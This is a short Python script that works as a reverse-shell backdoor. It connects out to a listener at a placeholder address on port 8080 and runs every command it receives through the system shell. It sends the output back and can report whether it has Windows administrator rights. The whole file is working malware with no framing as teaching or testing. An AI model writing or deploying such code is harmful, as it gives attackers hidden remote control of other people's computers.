import socket
import subprocess
import os
import ctypes

def checkUserLevel():
    try:
        is_admin = ctypes.WinDLL('Shell32').IsUserAnAdmin()
        if is_admin:
            return "[+] Admin privileges acquired."
        else:
            return "[!!] No admin privileges!"
    except:
        return "[!!] Unable to determine privilege level."

def connecting():
    s = socket.socket()
    s.connect(('0.0.0.0', 8080))

    while True:
        command = s.recv(5000)

        if 'terminate' in command.decode():
            s.close()
            break

        elif 'checkUserLevel' in command.decode():
            result = checkUserLevel()
            s.send(result.encode())

        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())

def main():
    connecting()

main()
